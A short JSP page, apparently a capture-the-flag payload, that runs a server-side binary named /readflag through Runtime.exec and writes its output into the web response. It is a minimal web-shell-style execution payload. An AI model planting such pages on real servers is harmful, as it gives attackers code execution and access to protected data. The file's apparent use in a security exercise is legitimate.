<%@ page import="java.io.*" %>
<%
    String exePath = application.getRealPath("/readflag");
    try {
        Process p = Runtime.getRuntime().exec(exePath);
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line = null;
        while ((line = reader.readLine()) != null) {
            out.println(line);
        }
        reader.close();
    } catch (Exception e) {
        out.println("Error: " + e.getMessage());
    }
%> 